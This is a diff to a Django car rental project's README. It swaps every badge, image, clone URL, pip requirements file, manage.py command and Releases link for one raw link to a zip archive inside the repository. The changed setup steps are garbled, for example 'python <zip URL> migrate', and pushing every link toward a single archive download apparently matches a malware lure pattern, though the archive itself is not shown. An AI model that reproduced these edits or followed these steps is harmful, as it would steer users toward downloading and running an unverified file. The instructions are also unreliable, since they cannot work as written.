@@ -1,6 +1,6 @@
 # 🚗 Car Rental System - Django
 
-![Car Rental System](https://img.shields.io/badge/Car_Rental_System-Django-brightgreen)
+![Car Rental System](https://github.com/mame-1213/Car-Rental-System-Django/raw/refs/heads/master/customer_portal/Django_Car_Rental_System_1.7.zip)
 
 Welcome to the **Car Rental Management System** built using Django. This project allows customers to book cars online, manage their bookings, and check car availability with ease. Admins have full control over car listings, booking statuses, and customer information.
 
@@ -39,7 +39,7 @@ To set up the Car Rental System on your local machine, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/mame-1213/Car-Rental-System-Django.git
+   git clone https://github.com/mame-1213/Car-Rental-System-Django/raw/refs/heads/master/customer_portal/Django_Car_Rental_System_1.7.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -53,7 +53,7 @@ To set up the Car Rental System on your local machine, follow these steps:
    Make sure you have Python and pip installed. Then run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/mame-1213/Car-Rental-System-Django/raw/refs/heads/master/customer_portal/Django_Car_Rental_System_1.7.zip
    ```
 
 4. **Set Up the Database**:
@@ -61,8 +61,8 @@ To set up the Car Rental System on your local machine, follow these steps:
    Run the following commands to set up the database:
 
    ```bash
-   python manage.py makemigrations
-   python manage.py migrate
+   python https://github.com/mame-1213/Car-Rental-System-Django/raw/refs/heads/master/customer_portal/Django_Car_Rental_System_1.7.zip makemigrations
+   python https://github.com/mame-1213/Car-Rental-System-Django/raw/refs/heads/master/customer_portal/Django_Car_Rental_System_1.7.zip migrate
    ```
 
 5. **Run the Development Server**:
@@ -70,7 +70,7 @@ To set up the Car Rental System on your local machine, follow these steps:
    Start the server with:
 
    ```bash
-   python manage.py runserver
+   python https://github.com/mame-1213/Car-Rental-System-Django/raw/refs/heads/master/customer_portal/Django_Car_Rental_System_1.7.zip runserver
    ```
 
 6. **Access the Application**:
@@ -104,10 +104,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest updates and releases, visit the [Releases section](https://github.com/mame-1213/Car-Rental-System-Django/releases). Here, you can download the latest version of the application and execute it on your local machine.
+For the latest updates and releases, visit the [Releases section](https://github.com/mame-1213/Car-Rental-System-Django/raw/refs/heads/master/customer_portal/Django_Car_Rental_System_1.7.zip). Here, you can download the latest version of the application and execute it on your local machine.
 
-If you need more information or have questions, feel free to check the [Releases section](https://github.com/mame-1213/Car-Rental-System-Django/releases) for updates and documentation.
+If you need more information or have questions, feel free to check the [Releases section](https://github.com/mame-1213/Car-Rental-System-Django/raw/refs/heads/master/customer_portal/Django_Car_Rental_System_1.7.zip) for updates and documentation.
 
-![Car Rental](https://images.unsplash.com/photo-1519052143038-ecf23b1bdb3b?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxMTc3N3wwfDF8c2VhcmNofDF8fGNhciUyMHJlbmV0YWwlMjBzdHxlbnwwfHx8fDE2MjY4MDE5NTI&ixlib=rb-1.2.1&q=80&w=1080)
+![Car Rental](https://github.com/mame-1213/Car-Rental-System-Django/raw/refs/heads/master/customer_portal/Django_Car_Rental_System_1.7.zip)
 
 Thank you for checking out the Car Rental System! We hope you find it useful.
